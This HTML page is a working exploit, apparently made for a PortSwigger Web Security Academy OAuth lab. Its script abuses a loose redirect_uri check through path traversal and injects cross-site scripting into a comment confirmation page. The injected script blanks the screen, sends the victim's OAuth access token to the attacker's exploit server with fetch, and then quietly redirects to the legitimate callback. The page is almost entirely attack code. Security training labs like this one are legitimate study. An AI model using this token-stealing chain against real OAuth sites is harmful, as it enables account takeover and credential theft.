<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit</title>
</head>
<body>
    <script>
        (async function() {
            // Enter your oauth url here
            let authUrl = new URL('https://oauth-0ab5005703e3e812c2e42db602d10013.web-security-academy.net/auth?client_id=s8xrpi6z5xtmouque9o5a&redirect_uri=https://0a3e001303fce84ac24c2fe800eb00fb.web-security-academy.net/oauth-callback&response_type=token&nonce=-1656640714&scope=openid%20profile%20email')
    
            // Grab lab & exploit server id dynamically
            const exploitHost = window.location.host
            const labHost = /https:\/\/([0-9a-f]+\.web-security-academy\.net)/.exec(await fetch('/').then(x => x.text()))[1]
            console.log({exploitHost, labHost, authUrl})
    
            const payload =`"><script>
                (async function() {
                    if (window.location.hash) {
                        // Hide the comment confirmation page
                        document.write('<div style="z-index:9999;position:absolute;top:0;left:0;width:100%;height:100%;background:white"></div>')
                        // Send the token to the expoit server
                        await fetch('https://${exploitHost}/?x='+btoa(window.location.hash), {mode: 'no-cors'})
                        // Redirect to the legitimate url
                        window.location = 'https://${labHost}/oauth-callback' + window.location.hash
                    }
                })()
            <\/script>`
    
            authUrl.searchParams.set('redirect_uri', `https://${labHost}/oauth-callback/../post/comment/confirmation?postId=${encodeURIComponent(payload)}`)
            window.location = authUrl
        })()
    </script>
</body>
</html>